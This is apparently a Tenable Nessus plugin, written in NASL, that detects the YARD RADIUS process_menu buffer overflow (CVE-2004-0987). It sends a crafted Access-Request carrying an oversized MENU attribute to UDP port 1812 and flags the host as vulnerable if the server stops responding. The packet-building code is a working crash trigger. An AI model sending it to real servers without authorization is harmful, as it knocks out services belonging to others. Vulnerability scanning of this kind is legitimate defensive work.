#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(15892);
 script_version ("$Revision: 1.6 $");
 script_cve_id("CVE-2004-0987");
 script_bugtraq_id(11753);
 script_xref(name:"OSVDB", value:"12139");
 script_xref(name:"Secunia", value:"13312");
 
 script_name(english:"YardRadius process_menu Function Remote Buffer Overflow");
 script_summary(english:"Overflows YARD RADIUS");

 script_set_attribute(
   attribute:"synopsis",
   value:string(
     "The remote host is running a vulnerable RADIUS server that may\n",
     "allow a remote attacker to gain a shell."
   )
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote host appears to be running YARD RADIUS 1.0.20 or older.\n",
     "This version is vulnerable to a buffer overflow that allows a remote\n",
     "attacker to execute arbitrary code in the context of the RADIUS\n",
     "server.\n",
     "\n",
     "*** It is likely that this check made the remote RADIUS server crash ***"
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/vendor/2004-q4/0069.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software"
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 exit(0);
}


include("global_settings.inc");

if (report_paranoia < 2) exit(0);

port = 1812;
if ( ! get_port_state(port) ) exit(0);

soc = open_sock_udp(port);

name = "Nessus";

coolreq = raw_string (0x01,      # Code: Access Request (1)
		  0x12,      # Packet identifier: 0x12 (18)
		  0x00,0x1C,      # Length: 58
		  # Authenticator :
		  0x20,0x20,0x20,0x20,0x20,0x20,0x31,0x31,0x30,0x31,0x39,0x31,0x32,0x38,0x34,0x32,
		  0x01,      # Attribute code : 1 (User-Name)
		  0x08,      # Att length
		  0x4E,0x65,0x73,0x73,0x75,0x73);

send(socket:soc, data:coolreq);
r = recv(socket:soc, length:4096);
if (!r) exit (0);

menu = "MENU=" + crap(data:"A", length:240);

req = raw_string (# Authenticator :
		  0x20,0x20,0x20,0x20,0x20,0x20,0x31,0x31,0x30,0x31,0x39,0x31,0x32,0x38,0x34,0x30,
		  0x01,      # Attribute code : 1 (User-Name)
		  (strlen(name)+2) % 256       # Attibute length
		  )
		  + name +
      raw_string (0x18,      # Attribute code : PW_STATE (24)
		  (strlen(menu)+2) % 256      # Attribute length
		  )
		  + menu;

len_hi = (strlen(req) + 4)/256;
len_lo = (strlen(req) + 4)%256;

req = raw_string (0x01,      # Code: Access Request (1)
		  0x12,      # Packet identifier: 0x12 (18)
		  len_hi,len_lo) + req;

send(socket:soc, data:req);
r = recv(socket:soc, length:4096);

send(socket:soc, data:coolreq);
r = recv(socket:soc, length:4096);
if (!r) security_hole(port);
